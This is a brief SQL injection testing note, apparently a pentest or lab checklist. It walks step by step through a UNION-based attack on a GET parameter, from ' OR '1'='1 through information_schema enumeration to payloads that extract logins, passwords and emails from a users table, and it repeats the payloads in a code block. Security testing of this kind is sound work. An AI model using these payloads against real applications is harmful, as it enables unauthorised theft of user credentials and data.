## Use case

The application is vulnerable to UNION-based SQL Injection through a GET parameter, allowing an attacker to extract sensitive user data from the database. This vulnerability matters because it can lead to unauthorized access to user credentials and other sensitive information.

## Steps to test

1. Identify a GET parameter in the URL, such as title=abc.
2. Inject the payload ' OR '1'='1 to confirm SQL Injection.
3. Determine the number of columns by using the payload ' OR '1'='1' ORDER BY 7# until an error occurs.
4. Use the payload ' UNION SELECT 1,2,3,4,5,6,7# to identify which columns are reflected in the output.
5. Modify the query to return only injected data using ' AND 1=1 UNION SELECT 1,2,3,4,5,6,7#.
6. Enumerate database tables with ' 'AND 1=1' union select 1, table_name,3,4,5,6,7 FROM information_schema.tables #.
7. Extract column names from the users table using ' 'AND 1=1' union select 1, column_name,3,4,5,6,7 FROM information_schema.columns where table_name ='users' #.
8. Finally, retrieve user data with ' 'AND 1=1' union select 1, id,login,password,email,6,7 from users #.

## Commands

```text
' OR '1'='1
' OR '1'='1' ORDER BY 7#
' UNION SELECT 1,2,3,4,5,6,7#
' AND 1=1 UNION SELECT 1,2,3,4,5,6,7#
' 'AND 1=1' union select 1, table_name,3,4,5,6,7 FROM information_schema.tables #
' 'AND 1=1' union select 1, column_name,3,4,5,6,7 FROM information_schema.columns where table_name ='users' #
' 'AND 1=1' union select 1, id,login,password,email,6,7 from users #
```
